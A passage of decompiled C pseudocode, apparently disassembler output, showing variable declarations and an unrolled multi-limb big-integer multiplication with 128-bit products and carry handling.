  unsigned __int64 v99; // r9
  __int64 v100; // r10
  unsigned __int128 v101; // ax
  unsigned __int64 v102; // r8
  unsigned __int64 v103; // r9
  __int64 v104; // r10
  unsigned __int128 v105; // ax
  unsigned __int64 v106; // r9
  __int64 v107; // r10
  unsigned __int128 v108; // ax
  unsigned __int64 v109; // rcx
  unsigned __int64 v110; // r10
  _BOOL8 v111; // r9
  unsigned __int128 v112; // ax
  unsigned __int64 v113; // r8
  unsigned __int64 v114; // r10
  _BOOL8 v115; // r9
  unsigned __int128 v116; // ax
  unsigned __int64 v117; // rcx
  unsigned __int64 v118; // r10
  _BOOL8 v119; // r9
  unsigned __int128 v120; // ax
  unsigned __int64 v121; // r8
  unsigned __int64 v122; // r10
  _BOOL8 v123; // r9
  unsigned __int128 v124; // ax
  unsigned __int64 v125; // rcx
  unsigned __int64 v126; // r10
  __int64 v127; // r9
  unsigned __int128 v128; // ax
  unsigned __int64 v129; // r8
  unsigned __int64 v130; // r10
  __int64 v131; // r9
  unsigned __int128 v132; // ax
  unsigned __int64 v133; // rcx
  unsigned __int64 v134; // r10
  __int64 v135; // r9
  unsigned __int128 v136; // ax
  unsigned __int64 v137; // r10
  __int64 v138; // r9
  unsigned __int128 v139; // ax
  unsigned __int64 v140; // rcx
  unsigned __int64 v141; // r9
  _BOOL8 v142; // r10
  unsigned __int128 v143; // ax
  unsigned __int64 v144; // r8
  unsigned __int64 v145; // r9
  _BOOL8 v146; // r10
  unsigned __int128 v147; // ax
  unsigned __int64 v148; // rcx
  unsigned __int64 v149; // r9
  _BOOL8 v150; // r10
  unsigned __int128 v151; // ax
  unsigned __int64 v152; // r8
  unsigned __int64 v153; // r9
  _BOOL8 v154; // r10
  unsigned __int128 v155; // ax
  unsigned __int64 v156; // rcx
  unsigned __int64 v157; // r9
  __int64 v158; // r10
  unsigned __int128 v159; // ax
  unsigned __int64 v160; // r8
  unsigned __int64 v161; // r9
  __int64 v162; // r10
  unsigned __int128 v163; // ax
  unsigned __int64 v164; // rcx
  unsigned __int64 v165; // r9
  __int64 v166; // r10
  unsigned __int128 v167; // ax
  unsigned __int64 v168; // r8
  unsigned __int64 v169; // r9
  __int64 v170; // r10
  unsigned __int128 v171; // ax
  unsigned __int64 v172; // r9
  __int64 v173; // r10
  unsigned __int128 v174; // ax
  unsigned __int64 v175; // rcx
  unsigned __int64 v176; // r10
  _BOOL8 v177; // r9
  unsigned __int128 v178; // ax
  unsigned __int64 v179; // r8
  unsigned __int64 v180; // r10
  _BOOL8 v181; // r9
  unsigned __int128 v182; // ax
  unsigned __int64 v183; // rcx
  unsigned __int64 v184; // r10
  _BOOL8 v185; // r9
  unsigned __int128 v186; // ax
  unsigned __int64 v187; // r8
  unsigned __int64 v188; // r10
  _BOOL8 v189; // r9
  unsigned __int128 v190; // ax
  unsigned __int64 v191; // rcx
  unsigned __int64 v192; // r10
  __int64 v193; // r9
  unsigned __int128 v194; // ax
  unsigned __int64 v195; // r8
  unsigned __int64 v196; // r10
  __int64 v197; // r9
  unsigned __int128 v198; // ax
  unsigned __int64 v199; // rcx
  unsigned __int64 v200; // r10
  __int64 v201; // r9
  unsigned __int128 v202; // ax
  unsigned __int64 v203; // r8
  unsigned __int64 v204; // r10
  __int64 v205; // r9
  unsigned __int128 v206; // ax
  unsigned __int64 v207; // rcx
  unsigned __int64 v208; // r10
  __int64 v209; // r9
  unsigned __int128 v210; // ax
  unsigned __int64 v211; // r10
  __int64 v212; // r9
  unsigned __int128 v213; // ax
  unsigned __int64 v214; // rcx
  unsigned __int64 v215; // r9
  _BOOL8 v216; // r10
  unsigned __int128 v217; // ax
  unsigned __int64 v218; // r8
  unsigned __int64 v219; // r9
  _BOOL8 v220; // r10
  unsigned __int128 v221; // ax
  unsigned __int64 v222; // rcx
  unsigned __int64 v223; // r9
  _BOOL8 v224; // r10
  unsigned __int128 v225; // ax
  unsigned __int64 v226; // r8
  unsigned __int64 v227; // r9
  _BOOL8 v228; // r10
  unsigned __int128 v229; // ax
  unsigned __int64 v230; // rcx
  unsigned __int64 v231; // r9
  __int64 v232; // r10
  unsigned __int128 v233; // ax
  unsigned __int64 v234; // r8
  unsigned __int64 v235; // r9
  __int64 v236; // r10
  unsigned __int128 v237; // ax
  unsigned __int64 v238; // rcx
  unsigned __int64 v239; // r9
  __int64 v240; // r10
  unsigned __int128 v241; // ax
  unsigned __int64 v242; // r8
  unsigned __int64 v243; // r9
  __int64 v244; // r10
  unsigned __int128 v245; // ax
  unsigned __int64 v246; // rcx
  unsigned __int64 v247; // r9
  __int64 v248; // r10
  unsigned __int128 v249; // ax
  unsigned __int64 v250; // r8
  unsigned __int64 v251; // r9
  __int64 v252; // r10
  unsigned __int128 v253; // ax
  unsigned __int64 v254; // r9
  __int64 v255; // r10
  unsigned __int128 v256; // ax
  unsigned __int64 v257; // rcx
  unsigned __int64 v258; // r10
  _BOOL8 v259; // r9
  unsigned __int128 v260; // ax
  unsigned __int64 v261; // r8
  unsigned __int64 v262; // r10
  _BOOL8 v263; // r9
  unsigned __int128 v264; // ax
  unsigned __int64 v265; // rcx
  unsigned __int64 v266; // r10
  _BOOL8 v267; // r9
  unsigned __int128 v268; // ax
  unsigned __int64 v269; // r8
  unsigned __int64 v270; // r10
  _BOOL8 v271; // r9
  unsigned __int128 v272; // ax
  unsigned __int64 v273; // rcx
  unsigned __int64 v274; // r10
  __int64 v275; // r9
  unsigned __int128 v276; // ax
  unsigned __int64 v277; // r8
  unsigned __int64 v278; // r10
  __int64 v279; // r9
  unsigned __int128 v280; // ax
  unsigned __int64 v281; // rcx
  unsigned __int64 v282; // r10
  __int64 v283; // r9
  unsigned __int128 v284; // ax
  unsigned __int64 v285; // r8
  unsigned __int64 v286; // r10
  __int64 v287; // r9
  unsigned __int128 v288; // ax
  unsigned __int64 v289; // rcx
  unsigned __int64 v290; // r10
  __int64 v291; // r9
  unsigned __int128 v292; // ax
  unsigned __int64 v293; // r8
  unsigned __int64 v294; // r10
  __int64 v295; // r9
  unsigned __int128 v296; // ax
  unsigned __int64 v297; // rcx
  unsigned __int64 v298; // r10
  __int64 v299; // r9
  unsigned __int128 v300; // ax
  unsigned __int64 v301; // r10
  __int64 v302; // r9
  unsigned __int128 v303; // ax
  unsigned __int64 v304; // rcx
  unsigned __int64 v305; // r9
  _BOOL8 v306; // r10
  unsigned __int128 v307; // ax
  unsigned __int64 v308; // r8
  unsigned __int64 v309; // r9
  _BOOL8 v310; // r10
  unsigned __int128 v311; // ax
  unsigned __int64 v312; // rcx
  unsigned __int64 v313; // r9
  _BOOL8 v314; // r10
  unsigned __int128 v315; // ax
  unsigned __int64 v316; // r8
  unsigned __int64 v317; // r9
  _BOOL8 v318; // r10
  unsigned __int128 v319; // ax
  unsigned __int64 v320; // rcx
  unsigned __int64 v321; // r9
  __int64 v322; // r10
  unsigned __int128 v323; // ax
  unsigned __int64 v324; // r8
  unsigned __int64 v325; // r9
  __int64 v326; // r10
  unsigned __int128 v327; // ax
  unsigned __int64 v328; // rcx
  unsigned __int64 v329; // r9
  __int64 v330; // r10
  unsigned __int128 v331; // ax
  unsigned __int64 v332; // r8
  unsigned __int64 v333; // r9
  __int64 v334; // r10
  unsigned __int128 v335; // ax
  unsigned __int64 v336; // rcx
  unsigned __int64 v337; // r9
  __int64 v338; // r10
  unsigned __int128 v339; // ax
  unsigned __int64 v340; // r8
  unsigned __int64 v341; // r9
  __int64 v342; // r10
  unsigned __int128 v343; // ax
  unsigned __int64 v344; // rcx
  unsigned __int64 v345; // r9
  __int64 v346; // r10
  unsigned __int128 v347; // ax
  unsigned __int64 v348; // r8
  unsigned __int64 v349; // r9
  __int64 v350; // r10
  unsigned __int128 v351; // ax
  unsigned __int64 v352; // r9
  __int64 v353; // r10
  unsigned __int128 v354; // ax
  unsigned __int64 v355; // rcx
  unsigned __int64 v356; // r10
  _BOOL8 v357; // r11
  unsigned __int128 v358; // ax
  unsigned __int64 v359; // r8
  unsigned __int64 v360; // r10
  _BOOL8 v361; // r11
  unsigned __int128 v362; // ax
  unsigned __int64 v363; // rcx
  unsigned __int64 v364; // r10
  _BOOL8 v365; // r11
  unsigned __int128 v366; // ax
  unsigned __int64 v367; // r8
  unsigned __int64 v368; // r10
  _BOOL8 v369; // r11
  unsigned __int128 v370; // ax
  unsigned __int64 v371; // rcx
  unsigned __int64 v372; // r10
  __int64 v373; // r11
  unsigned __int128 v374; // ax
  unsigned __int64 v375; // r8
  unsigned __int64 v376; // r10
  __int64 v377; // r11
  unsigned __int128 v378; // ax
  unsigned __int64 v379; // rcx
  unsigned __int64 v380; // r10
  __int64 v381; // r11
  unsigned __int128 v382; // ax
  unsigned __int64 v383; // r8
  unsigned __int64 v384; // r10
  __int64 v385; // r11
  unsigned __int128 v386; // ax
  unsigned __int64 v387; // rcx
  unsigned __int64 v388; // r10
  __int64 v389; // r11
  unsigned __int128 v390; // ax
  unsigned __int64 v391; // r8
  unsigned __int64 v392; // r10
  __int64 v393; // r11
  unsigned __int128 v394; // ax
  unsigned __int64 v395; // rcx
  unsigned __int64 v396; // r10
  __int64 v397; // r11
  unsigned __int128 v398; // ax
  unsigned __int64 v399; // r8
  unsigned __int64 v400; // r10
  __int64 v401; // r11
  unsigned __int128 v402; // ax
  unsigned __int64 v403; // rcx
  unsigned __int64 v404; // r10
  __int64 v405; // r11
  unsigned __int128 v406; // ax
  unsigned __int64 v407; // r10
  __int64 v408; // r11
  unsigned __int128 v409; // ax
  unsigned __int64 v410; // rcx
  __int64 v411; // r11
  unsigned __int128 v412; // ax
  unsigned __int64 v413; // r8
  __int64 v414; // r11
  unsigned __int128 v415; // ax
  unsigned __int64 v416; // rcx
  __int64 v417; // r11
  unsigned __int128 v418; // ax
  unsigned __int64 v419; // r8
  __int64 v420; // r11
  unsigned __int128 v421; // ax
  unsigned __int64 v422; // rcx
  __int64 v423; // r11
  unsigned __int128 v424; // ax
  unsigned __int64 v425; // r8
  __int64 v426; // r11
  unsigned __int128 v427; // ax
  unsigned __int64 v428; // rcx
  __int64 v429; // r11
  unsigned __int128 v430; // ax
  unsigned __int64 v431; // r8
  __int64 v432; // r11
  unsigned __int128 v433; // ax
  unsigned __int64 v434; // rcx
  __int64 v435; // r11
  unsigned __int128 v436; // ax
  unsigned __int64 v437; // r8
  __int64 v438; // r11
  unsigned __int128 v439; // ax
  unsigned __int64 v440; // rcx
  __int64 v441; // r11
  unsigned __int128 v442; // ax
  unsigned __int64 v443; // r8
  __int64 v444; // r11
  unsigned __int128 v445; // ax
  unsigned __int64 v446; // rcx
  __int64 v447; // r11
  unsigned __int128 v448; // ax
  unsigned __int64 v449; // r8
  __int64 v450; // r11
  unsigned __int128 v451; // ax
  unsigned __int64 result; // rax

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = *a2 * (unsigned __int128)a3[1] >> 64;
  v9 = __PAIR__(a3[1], (unsigned __int64)v6) * v7 >> 64;
  v10 = a2[1] * (unsigned __int128)*v4;
  *(_QWORD *)&v10 = v9 + v10;
  a1[1] = v10;
  *((_QWORD *)&v10 + 1) += (unsigned __int64)v10 < v9;
  v11 = *((_QWORD *)&v10 + 1) + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v12 = v11 < *((_QWORD *)&v10 + 1);
  v13 = *v3 * (unsigned __int128)v4[2];
  v14 = v11 + v13;
  *((_QWORD *)&v13 + 1) += v11 + (unsigned __int64)v13 < v11;
  v15 = *((_QWORD *)&v13 + 1) + v12;
  v16 = v15 < *((_QWORD *)&v13 + 1);
  v17 = v3[1] * (unsigned __int128)v4[1];
  v18 = v14 + v17;
  *((_QWORD *)&v17 + 1) += v14 + (unsigned __int64)v17 < v14;
  v19 = *((_QWORD *)&v17 + 1) + v15;
  v20 = (v19 < *((_QWORD *)&v17 + 1)) + v16;
  v21 = v3[2] * (unsigned __int128)*v4;
  *(_QWORD *)&v21 = v18 + v21;
  v5[2] = v21;
  *((_QWORD *)&v21 + 1) += (unsigned __int64)v21 < v18;
  v22 = *((_QWORD *)&v21 + 1) + v19;
  v23 = (v22 < *((_QWORD *)&v21 + 1)) + v20;
  v24 = *v3 * (unsigned __int128)v4[3];
  v25 = v22 + v24;
  *((_QWORD *)&v24 + 1) += v22 + (unsigned __int64)v24 < v22;
  v26 = *((_QWORD *)&v24 + 1) + v23;
  v27 = v26 < *((_QWORD *)&v24 + 1);
  v28 = v3[1] * (unsigned __int128)v4[2];
  v29 = v25 + v28;
  *((_QWORD *)&v28 + 1) += v25 + (unsigned __int64)v28 < v25;
  v30 = *((_QWORD *)&v28 + 1) + v26;
  v31 = (v30 < *((_QWORD *)&v28 + 1)) + v27;
  v32 = v3[2] * (unsigned __int128)v4[1];
  v33 = v29 + v32;
  *((_QWORD *)&v32 + 1) += v29 + (unsigned __int64)v32 < v29;
  v34 = *((_QWORD *)&v32 + 1) + v30;
  v35 = (v34 < *((_QWORD *)&v32 + 1)) + v31;
  v36 = v3[3] * (unsigned __int128)*v4;
  *(_QWORD *)&v36 = v33 + v36;
  *((_QWORD *)&v36 + 1) += (unsigned __int64)v36 < v33;
  v37 = *((_QWORD *)&v36 + 1) + v34;
  v5[3] = v36;
  v38 = (v37 < *((_QWORD *)&v36 + 1)) + v35;
  v39 = *v3 * (unsigned __int128)v4[4];
  v40 = v37 + v39;
  *((_QWORD *)&v39 + 1) += v37 + (unsigned __int64)v39 < v37;
  v41 = *((_QWORD *)&v39 + 1) + v38;
  v42 = v41 < *((_QWORD *)&v39 + 1);
  v43 = v3[1] * (unsigned __int128)v4[3];
  v44 = v40 + v43;
  *((_QWORD *)&v43 + 1) += v40 + (unsigned __int64)v43 < v40;
  v45 = *((_QWORD *)&v43 + 1) + v41;
  v46 = (v45 < *((_QWORD *)&v43 + 1)) + v42;
  v47 = v3[2] * (unsigned __int128)v4[2];
  v48 = v44 + v47;
  *((_QWORD *)&v47 + 1) += v44 + (unsigned __int64)v47 < v44;
  v49 = *((_QWORD *)&v47 + 1) + v45;
  v50 = (v49 < *((_QWORD *)&v47 + 1)) + v46;
  v51 = v3[3] * (unsigned __int128)v4[1];
  v52 = v48 + v51;
  *((_QWORD *)&v51 + 1) += v48 + (unsigned __int64)v51 < v48;
  v53 = *((_QWORD *)&v51 + 1) + v49;
  v54 = (v53 < *((_QWORD *)&v51 + 1)) + v50;
  v55 = v3[4] * (unsigned __int128)*v4;
  *(_QWORD *)&v55 = v52 + v55;
  v5[4] = v55;
  *((_QWORD *)&v55 + 1) += (unsigned __int64)v55 < v52;
  v56 = *((_QWORD *)&v55 + 1) + v53;
  v57 = (v56 < *((_QWORD *)&v55 + 1)) + v54;
  v58 = *v3 * (unsigned __int128)v4[5];
  v59 = v56 + v58;
  *((_QWORD *)&v58 + 1) += v56 + (unsigned __int64)v58 < v56;
  v60 = *((_QWORD *)&v58 + 1) + v57;
  v61 = v60 < *((_QWORD *)&v58 + 1);
  v62 = v3[1] * (unsigned __int128)v4[4];
  v63 = v59 + v62;
  *((_QWORD *)&v62 + 1) += v59 + (unsigned __int64)v62 < v59;
  v64 = *((_QWORD *)&v62 + 1) + v60;
  v65 = (v64 < *((_QWORD *)&v62 + 1)) + v61;
  v66 = v3[2] * (unsigned __int128)v4[3];
  v67 = v63 + v66;
  *((_QWORD *)&v66 + 1) += v63 + (unsigned __int64)v66 < v63;
  v68 = *((_QWORD *)&v66 + 1) + v64;
  v69 = (v68 < *((_QWORD *)&v66 + 1)) + v65;
  v70 = v3[3] * (unsigned __int128)v4[2];
  v71 = v67 + v70;
  *((_QWORD *)&v70 + 1) += v67 + (unsigned __int64)v70 < v67;
  v72 = *((_QWORD *)&v70 + 1) + v68;
  v73 = (v72 < *((_QWORD *)&v70 + 1)) + v69;
  v74 = v3[4] * (unsigned __int128)v4[1];
  v75 = v71 + v74;
  *((_QWORD *)&v74 + 1) += v71 + (unsigned __int64)v74 < v71;
  v76 = *((_QWORD *)&v74 + 1) + v72;
  v77 = (v76 < *((_QWORD *)&v74 + 1)) + v73;
  v78 = v3[5] * (unsigned __int128)*v4;
  *(_QWORD *)&v78 = v75 + v78;
  v5[5] = v78;
  *((_QWORD *)&v78 + 1) += (unsigned __int64)v78 < v75;
  v79 = *((_QWORD *)&v78 + 1) + v76;
  v80 = (v79 < *((_QWORD *)&v78 + 1)) + v77;
  v81 = *v3 * (unsigned __int128)v4[6];
  v82 = v79 + v81;
  *((_QWORD *)&v81 + 1) += v79 + (unsigned __int64)v81 < v79;
  v83 = *((_QWORD *)&v81 + 1) + v80;
  v84 = v83 < *((_QWORD *)&v81 + 1);
  v85 = v3[1] * (unsigned __int128)v4[5];
  v86 = v82 + v85;
  *((_QWORD *)&v85 + 1) += v82 + (unsigned __int64)v85 < v82;
  v87 = *((_QWORD *)&v85 + 1) + v83;
  v88 = (v87 < *((_QWORD *)&v85 + 1)) + v84;
  v89 = v3[2] * (unsigned __int128)v4[4];
  v90 = v86 + v89;
  *((_QWORD *)&v89 + 1) += v86 + (unsigned __int64)v89 < v86;
  v91 = *((_QWORD *)&v89 + 1) + v87;
  v92 = (v91 < *((_QWORD *)&v89 + 1)) + v88;
  v93 = v3[3] * (unsigned __int128)v4[3];
  v94 = v90 + v93;
  *((_QWORD *)&v93 + 1) += v90 + (unsigned __int64)v93 < v90;
  v95 = *((_QWORD *)&v93 + 1) + v91;
  v96 = (v95 < *((_QWORD *)&v93 + 1)) + v92;
  v97 = v3[4] * (unsigned __int128)v4[2];
  v98 = v94 + v97;
  *((_QWORD *)&v97 + 1) += v94 + (unsigned __int64)v97 < v94;
  v99 = *((_QWORD *)&v97 + 1) + v95;
  v100 = (v99 < *((_QWORD *)&v97 + 1)) + v96;
  v101 = v3[5] * (unsigned __int128)v4[1];
  v102 = v98 + v101;
  *((_QWORD *)&v101 + 1) += v98 + (unsigned __int64)v101 < v98;
  v103 = *((_QWORD *)&v101 + 1) + v99;
  v104 = (v103 < *((_QWORD *)&v101 + 1)) + v100;
  v105 = v3[6] * (unsigned __int128)*v4;
  *(_QWORD *)&v105 = v102 + v105;
  v5[6] = v105;
  *((_QWORD *)&v105 + 1) += (unsigned __int64)v105 < v102;
  v106 = *((_QWORD *)&v105 + 1) + v103;
  v107 = (v106 < *((_QWORD *)&v105 + 1)) + v104;
  v108 = *v3 * (unsigned __int128)v4[7];
  v109 = v106 + v108;
  *((_QWORD *)&v108 + 1) += v106 + (unsigned __int64)v108 < v106;
  v110 = *((_QWORD *)&v108 + 1) + v107;
  v111 = v110 < *((_QWORD *)&v108 + 1);
  v112 = v3[1] * (unsigned __int128)v4[6];
  v113 = v109 + v112;
  *((_QWORD *)&v112 + 1) += v109 + (unsigned __int64)v112 < v109;
  v114 = *((_QWORD *)&v112 + 1) + v110;
  v115 = (v114 < *((_QWORD *)&v112 + 1)) + v111;
  v116 = v3[2] * (unsigned __int128)v4[5];
  v117 = v113 + v116;
  *((_QWORD *)&v116 + 1) += v113 + (unsigned __int64)v116 < v113;
  v118 = *((_QWORD *)&v116 + 1) + v114;
  v119 = (v118 < *((_QWORD *)&v116 + 1)) + v115;
  v120 = v3[3] * (unsigned __int128)v4[4];
  v121 = v117 + v120;
  *((_QWORD *)&v120 + 1) += v117 + (unsigned __int64)v120 < v117;
  v122 = *((_QWORD *)&v120 + 1) + v118;
  v123 = (v122 < *((_QWORD *)&v120 + 1)) + v119;
  v124 = v3[4] * (unsigned __int128)v4[3];
  v125 = v121 + v124;
  *((_QWORD *)&v124 + 1) += v121 + (unsigned __int64)v124 < v121;
  v126 = *((_QWORD *)&v124 + 1) + v122;
  v127 = (v126 < *((_QWORD *)&v124 + 1)) + v123;
  v128 = v3[5] * (unsigned __int128)v4[2];
  v129 = v125 + v128;
  *((_QWORD *)&v128 + 1) += v125 + (unsigned __int64)v128 < v125;
  v130 = *((_QWORD *)&v128 + 1) + v126;
  v131 = (v130 < *((_QWORD *)&v128 + 1)) + v127;
  v132 = v3[6] * (unsigned __int128)v4[1];
  v133 = v129 + v132;
  *((_QWORD *)&v132 + 1) += v129 + (unsigned __int64)v132 < v129;
  v134 = *((_QWORD *)&v132 + 1) + v130;
  v135 = (v134 < *((_QWORD *)&v132 + 1)) + v131;
  v136 = v3[7] * (unsigned __int128)*v4;
  *(_QWORD *)&v136 = v133 + v136;
  v5[7] = v136;
  *((_QWORD *)&v136 + 1) += (unsigned __int64)v136 < v133;
  v137 = *((_QWORD *)&v136 + 1) + v134;
  v138 = (v137 < *((_QWORD *)&v136 + 1)) + v135;
  v139 = *v3 * (unsigned __int128)v4[8];
  v140 = v137 + v139;
  *((_QWORD *)&v139 + 1) += v137 + (unsigned __int64)v139 < v137;
  v141 = *((_QWORD *)&v139 + 1) + v138;
  v142 = v141 < *((_QWORD *)&v139 + 1);
  v143 = v3[1] * (unsigned __int128)v4[7];
  v144 = v140 + v143;
  *((_QWORD *)&v143 + 1) += v140 + (unsigned __int64)v143 < v140;
  v145 = *((_QWORD *)&v143 + 1) + v141;
  v146 = (v145 < *((_QWORD *)&v143 + 1)) + v142;
  v147 = v3[2] * (unsigned __int128)v4[6];
  v148 = v144 + v147;
  *((_QWORD *)&v147 + 1) += v144 + (unsigned __int64)v147 < v144;
  v149 = *((_QWORD *)&v147 + 1) + v145;
  v150 = (v149 < *((_QWORD *)&v147 + 1)) + v146;
  v151 = v3[3] * (unsigned __int128)v4[5];
  v152 = v148 + v151;
  *((_QWORD *)&v151 + 1) += v148 + (unsigned __int64)v151 < v148;
  v153 = *((_QWORD *)&v151 + 1) + v149;
  v154 = (v153 < *((_QWORD *)&v151 + 1)) + v150;
  v155 = v3[4] * (unsigned __int128)v4[4];
  v156 = v152 + v155;
  *((_QWORD *)&v155 + 1) += v152 + (unsigned __int64)v155 < v152;
  v157 = *((_QWORD *)&v155 + 1) + v153;
  v158 = (v157 < *((_QWORD *)&v155 + 1)) + v154;
  v159 = v3[5] * (unsigned __int128)v4[3];
  v160 = v156 + v159;
  *((_QWORD *)&v159 + 1) += v156 + (unsigned __int64)v159 < v156;
  v161 = *((_QWORD *)&v159 + 1) + v157;
  v162 = (v161 < *((_QWORD *)&v159 + 1)) + v158;
  v163 = v3[6] * (unsigned __int128)v4[2];
  v164 = v160 + v163;
  *((_QWORD *)&v163 + 1) += v160 + (unsigned __int64)v163 < v160;
  v165 = *((_QWORD *)&v163 + 1) + v161;
  v166 = (v165 < *((_QWORD *)&v163 + 1)) + v162;
  v167 = v3[7] * (unsigned __int128)v4[1];
  v168 = v164 + v167;
  *((_QWORD *)&v167 + 1) += v164 + (unsigned __int64)v167 < v164;
  v169 = *((_QWORD *)&v167 + 1) + v165;
  v170 = (v169 < *((_QWORD *)&v167 + 1)) + v166;
  v171 = v3[8] * (unsigned __int128)*v4;
  *(_QWORD *)&v171 = v168 + v171;
  v5[8] = v171;
  *((_QWORD *)&v171 + 1) += (unsigned __int64)v171 < v168;
  v172 = *((_QWORD *)&v171 + 1) + v169;
  v173 = (v172 < *((_QWORD *)&v171 + 1)) + v170;
  v174 = *v3 * (unsigned __int128)v4[9];
  v175 = v172 + v174;
  *((_QWORD *)&v174 + 1) += v172 + (unsigned __int64)v174 < v172;
  v176 = *((_QWORD *)&v174 + 1) + v173;
  v177 = v176 < *((_QWORD *)&v174 + 1);
  v178 = v3[1] * (unsigned __int128)v4[8];
  v179 = v175 + v178;
  *((_QWORD *)&v178 + 1) += v175 + (unsigned __int64)v178 < v175;
  v180 = *((_QWORD *)&v178 + 1) + v176;
  v181 = (v180 < *((_QWORD *)&v178 + 1)) + v177;
  v182 = v3[2] * (unsigned __int128)v4[7];
  v183 = v179 + v182;
  *((_QWORD *)&v182 + 1) += v179 + (unsigned __int64)v182 < v179;
  v184 = *((_QWORD *)&v182 + 1) + v180;
  v185 = (v184 < *((_QWORD *)&v182 + 1)) + v181;
  v186 = v3[3] * (unsigned __int128)v4[6];
  v187 = v183 + v186;
  *((_QWORD *)&v186 + 1) += v183 + (unsigned __int64)v186 < v183;
  v188 = *((_QWORD *)&v186 + 1) + v184;
  v189 = (v188 < *((_QWORD *)&v186 + 1)) + v185;
  v190 = v3[4] * (unsigned __int128)v4[5];
  v191 = v187 + v190;
  *((_QWORD *)&v190 + 1) += v187 + (unsigned __int64)v190 < v187;
  v192 = *((_QWORD *)&v190 + 1) + v188;
  v193 = (v192 < *((_QWORD *)&v190 + 1)) + v189;
  v194 = v3[5] * (unsigned __int128)v4[4];
  v195 = v191 + v194;
  *((_QWORD *)&v194 + 1) += v191 + (unsigned __int64)v194 < v191;
  v196 = *((_QWORD *)&v194 + 1) + v192;
  v197 = (v196 < *((_QWORD *)&v194 + 1)) + v193;
  v198 = v3[6] * (unsigned __int128)v4[3];
  v199 = v195 + v198;
  *((_QWORD *)&v198 + 1) += v195 + (unsigned __int64)v198 < v195;
  v200 = *((_QWORD *)&v198 + 1) + v196;
  v201 = (v200 < *((_QWORD *)&v198 + 1)) + v197;
  v202 = v3[7] * (unsigned __int128)v4[2];
  v203 = v199 + v202;
  *((_QWORD *)&v202 + 1) += v199 + (unsigned __int64)v202 < v199;
  v204 = *((_QWORD *)&v202 + 1) + v200;
  v205 = (v204 < *((_QWORD *)&v202 + 1)) + v201;
  v206 = v3[8] * (unsigned __int128)v4[1];
  v207 = v203 + v206;
  *((_QWORD *)&v206 + 1) += v203 + (unsigned __int64)v206 < v203;
  v208 = *((_QWORD *)&v206 + 1) + v204;
  v209 = (v208 < *((_QWORD *)&v206 + 1)) + v205;
  v210 = v3[9] * (unsigned __int128)*v4;
  *(_QWORD *)&v210 = v207 + v210;
  v5[9] = v210;
  *((_QWORD *)&v210 + 1) += (unsigned __int64)v210 < v207;
  v211 = *((_QWORD *)&v210 + 1) + v208;
  v212 = (v211 < *((_QWORD *)&v210 + 1)) + v209;
  v213 = *v3 * (unsigned __int128)v4[10];
  v214 = v211 + v213;
  *((_QWORD *)&v213 + 1) += v211 + (unsigned __int64)v213 < v211;
  v215 = *((_QWORD *)&v213 + 1) + v212;
  v216 = v215 < *((_QWORD *)&v213 + 1);
  v217 = v3[1] * (unsigned __int128)v4[9];
  v218 = v214 + v217;
  *((_QWORD *)&v217 + 1) += v214 + (unsigned __int64)v217 < v214;
  v219 = *((_QWORD *)&v217 + 1) + v215;
  v220 = (v219 < *((_QWORD *)&v217 + 1)) + v216;
  v221 = v3[2] * (unsigned __int128)v4[8];
  v222 = v218 + v221;
  *((_QWORD *)&v221 + 1) += v218 + (unsigned __int64)v221 < v218;
  v223 = *((_QWORD *)&v221 + 1) + v219;
  v224 = (v223 < *((_QWORD *)&v221 + 1)) + v220;
  v225 = v3[3] * (unsigned __int128)v4[7];
  v226 = v222 + v225;
  *((_QWORD *)&v225 + 1) += v222 + (unsigned __int64)v225 < v222;
  v227 = *((_QWORD *)&v225 + 1) + v223;
  v228 = (v227 < *((_QWORD *)&v225 + 1)) + v224;
  v229 = v3[4] * (unsigned __int128)v4[6];
  v230 = v226 + v229;
  *((_QWORD *)&v229 + 1) += v226 + (unsigned __int64)v229 < v226;
  v231 = *((_QWORD *)&v229 + 1) + v227;
  v232 = (v231 < *((_QWORD *)&v229 + 1)) + v228;
  v233 = v3[5] * (unsigned __int128)v4[5];
  v234 = v230 + v233;
  *((_QWORD *)&v233 + 1) += v230 + (unsigned __int64)v233 < v230;
  v235 = *((_QWORD *)&v233 + 1) + v231;
  v236 = (v235 < *((_QWORD *)&v233 + 1)) + v232;
  v237 = v3[6] * (unsigned __int128)v4[4];
  v238 = v234 + v237;
  *((_QWORD *)&v237 + 1) += v234 + (unsigned __int64)v237 < v234;
  v239 = *((_QWORD *)&v237 + 1) + v235;
  v240 = (v239 < *((_QWORD *)&v237 + 1)) + v236;
  v241 = v3[7] * (unsigned __int128)v4[3];
  v242 = v238 + v241;
  *((_QWORD *)&v241 + 1) += v238 + (unsigned __int64)v241 < v238;
  v243 = *((_QWORD *)&v241 + 1) + v239;
  v244 = (v243 < *((_QWORD *)&v241 + 1)) + v240;
  v245 = v3[8] * (unsigned __int128)v4[2];
  v246 = v242 + v245;
  *((_QWORD *)&v245 + 1) += v242 + (unsigned __int64)v245 < v242;
  v247 = *((_QWORD *)&v245 + 1) + v243;
  v248 = (v247 < *((_QWORD *)&v245 + 1)) + v244;
  v249 = v3[9] * (unsigned __int128)v4[1];
  v250 = v246 + v249;
  *((_QWORD *)&v249 + 1) += v246 + (unsigned __int64)v249 < v246;
  v251 = *((_QWORD *)&v249 + 1) + v247;
  v252 = (v251 < *((_QWORD *)&v249 + 1)) + v248;
  v253 = v3[10] * (unsigned __int128)*v4;
  *(_QWORD *)&v253 = v250 + v253;
  v5[10] = v253;
  *((_QWORD *)&v253 + 1) += (unsigned __int64)v253 < v250;
  v254 = *((_QWORD *)&v253 + 1) + v251;
  v255 = (v254 < *((_QWORD *)&v253 + 1)) + v252;
  v256 = *v3 * (unsigned __int128)v4[11];
  v257 = v254 + v256;
  *((_QWORD *)&v256 + 1) += v254 + (unsigned __int64)v256 < v254;
  v258 = *((_QWORD *)&v256 + 1) + v255;
  v259 = v258 < *((_QWORD *)&v256 + 1);
  v260 = v3[1] * (unsigned __int128)v4[10];
  v261 = v257 + v260;
  *((_QWORD *)&v260 + 1) += v257 + (unsigned __int64)v260 < v257;
  v262 = *((_QWORD *)&v260 + 1) + v258;
  v263 = (v262 < *((_QWORD *)&v260 + 1)) + v259;
  v264 = v3[2] * (unsigned __int128)v4[9];
  v265 = v261 + v264;
  *((_QWORD *)&v264 + 1) += v261 + (unsigned __int64)v264 < v261;
  v266 = *((_QWORD *)&v264 + 1) + v262;
  v267 = (v266 < *((_QWORD *)&v264 + 1)) + v263;
  v268 = v3[3] * (unsigned __int128)v4[8];
